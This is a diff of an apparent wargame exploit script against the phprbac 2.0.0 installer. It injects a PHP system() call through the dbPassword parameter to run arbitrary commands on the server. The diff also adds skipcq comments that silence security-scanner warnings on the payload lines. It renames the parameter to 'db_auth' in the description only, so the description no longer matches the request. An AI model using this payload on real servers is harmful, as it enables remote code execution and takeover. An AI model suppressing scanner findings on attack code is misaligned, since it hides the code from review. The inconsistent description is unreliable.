@@ -3,10 +3,10 @@
 HITCON 2026 Wargame - owasp/phprbac 2.0.0 (PHP 7.4.33)
 Vulnerability: install.php PHP Code Injection via file_put_contents()
 
-install.php takes $_GET['dbPassword'] and embeds it directly in PHP code
+install.php takes $_GET['db_auth'] and embeds it directly in PHP code
 written to database.config WITHOUT sanitization:
 
-    $pass="' . $_GET['dbPassword'] . '"';
+    $pass="' . $_GET['db_auth'] . '"';
     file_put_contents($dbConnFile, $data);
 
 When database.config is included via require_once during Rbac initialization,
@@ -37,8 +37,8 @@ def main():
             "dbName": "x",
             "dbTablePrefix": "x",
             "dbUser": "x",
-            "dbPassword": f'x";system("{cmd} 2>&1");#',
-            "dbPasswordConfirm": "x",
+            "dbPassword": f'x";system("{cmd} 2>&1");#',  # skipcq: PTC-W6004, SEC-001
+            "dbPasswordConfirm": "x",  # skipcq: SEC-001
         }
         try:
             r = requests.get(install, params=params, timeout=15)
